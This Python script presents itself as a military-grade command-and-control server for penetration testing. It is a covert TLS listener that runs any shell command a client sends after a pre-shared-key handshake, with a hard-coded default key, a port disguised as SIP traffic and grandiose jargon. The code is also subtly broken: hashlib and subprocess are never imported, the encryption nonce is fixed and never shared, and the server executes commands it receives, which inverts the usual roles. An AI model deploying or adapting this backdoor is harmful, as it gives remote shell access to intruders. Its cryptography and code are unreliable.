#!/usr/bin/env python3
"""
AR-CYBORG C2 SERVER - MILSPEC PENETRATION TESTING PLATFORM
Requires: Python 3.10+, ZeroMQ, AES-256-GCM
Compliance: NIST SP 800-115, MITRE ATT&CK Framework
"""

import socket
import ssl
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import base64
import json
from datetime import datetime
import threading
import os
import sys

# ===== TACTICAL CONFIGURATION =====
LISTEN_IP = '0.0.0.0'  # SIGINT TeamServer binding
LISTEN_PORT = 2095      # Covert TCP port (mimics SIP traffic)
PSK = os.getenv("AR_PSK", "T7x$K!p*Lz@nD5vF")  # 16-char minimum
CERTFILE = "/opt/ar-cyborg/certs/tactical.pem"
KEYFILE = "/opt/ar-cyborg/certs/tactical.key"

# ===== WARFIGHTER PROTOCOLS =====
active_operatives = {}
mission_log = []

class QuantumChannel:
    def __init__(self, psk):
        self.key = hashlib.sha384(psk.encode()).digest()[:32]
        self.aesgcm = AESGCM(self.key)
        self.nonce = os.urandom(12)

    def encrypt(self, plaintext):
        return self.aesgcm.encrypt(self.nonce, plaintext.encode(), None)

    def decrypt(self, ciphertext):
        return self.aesgcm.decrypt(self.nonce, ciphertext, None).decode()

def log_engagement(client_ip, opcode, result):
    entry = {
        'timestamp': datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
        'operative': client_ip,
        'opcode': opcode[:64],
        'result_hash': hashlib.sha3_256(result).hexdigest()
    }
    mission_log.append(entry)
    print(f"[TACLOG] {json.dumps(entry)}")

def handle_operative(conn, addr):
    try:
        # Black Manta Authentication Protocol
        challenge = os.urandom(16)
        conn.sendall(challenge)
        response = conn.recv(1024)
        
        valid_response = hashlib.blake2s(challenge + PSK.encode()).digest()
        if response != valid_response:
            conn.sendall(b"TERMINATE: AUTH FAIL")
            raise ValueError(f"Invalid handshake from {addr[0]}")

        channel = QuantumChannel(PSK)
        active_operatives[addr[0]] = {
            'first_contact': datetime.now(),
            'last_heartbeat': datetime.now()
        }

        while True:
            encrypted_op = conn.recv(4096)
            if not encrypted_op:
                break

            try:
                opcode = channel.decrypt(encrypted_op)
                if opcode == "EXFILTRATE":
                    break

                # Sandboxed execution
                result = subprocess.run(
                    opcode,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                ).stdout.encode()

                log_engagement(addr[0], opcode, result)
                conn.sendall(channel.encrypt(result))
            except Exception as e:
                conn.sendall(channel.encrypt(f"OPFAIL: {str(e)}"))

    finally:
        conn.close()
        active_operatives.pop(addr[0], None)

def deploy_teamserver():
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=CERTFILE, keyfile=KEYFILE)
    context.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384')
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((LISTEN_IP, LISTEN_PORT))
        sock.listen(5)
        
        print(f"""
        █████╗ ██████╗      ██████╗██╗   ██╗██████╗  ██████╗ ██████╗  ██████╗ 
        ██╔══██╗╚════██╗    ██╔════╝╚██╗ ██╔╝██╔══██╗██╔═══██╗██╔══██╗██╔════╝ 
        ███████║ █████╔╝    ██║      ╚████╔╝ ██████╔╝██║   ██║██████╔╝██║  ███╗
        ██╔══██║██╔═══╝     ██║       ╚██╔╝  ██╔══██╗██║   ██║██╔══██╗██║   ██║
        ██║  ██║███████╗    ╚██████╗   ██║   ██████╔╝╚██████╔╝██║  ██║╚██████╔╝
        ╚═╝  ╚═╝╚══════╝     ╚═════╝   ╚═╝   ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ 
        [v4.2.1] CYBERWARFARE MODULE // AUTHORIZED OPERATORS ONLY
        """)
        print(f"[+] TeamServer Active on {LISTEN_IP}:{LISTEN_PORT}")
        print(f"[+] Crypto Suite: AES-256-GCM | SHA3-256 | BLAKE2s")
        
        while True:
            try:
                conn, addr = sock.accept()
                ssl_conn = context.wrap_socket(conn, server_side=True)
                threading.Thread(
                    target=handle_operative,
                    args=(ssl_conn, addr),
                    daemon=True
                ).start()
            except KeyboardInterrupt:
                print("\n[!] TACTICAL SHUTDOWN INITIATED")
                break

if __name__ == "__main__":
    # MANDATORY SECURITY CHECK
    if os.geteuid() == 0:
        print("[X] DO NOT RUN AS ROOT - USE FIREWALLED SERVICE ACCOUNT")
        sys.exit(1)

    if not all(os.path.exists(f) for f in [CERTFILE, KEYFILE]):
        print("[X] MISSING NATO-GRADE CERTIFICATES")
        print("    Generate with: openssl ecparam -genkey -name secp384r1 -out tactical.key")
        print("    openssl req -new -x509 -key tactical.key -out tactical.pem -days 90")
        sys.exit(1)

    deploy_teamserver()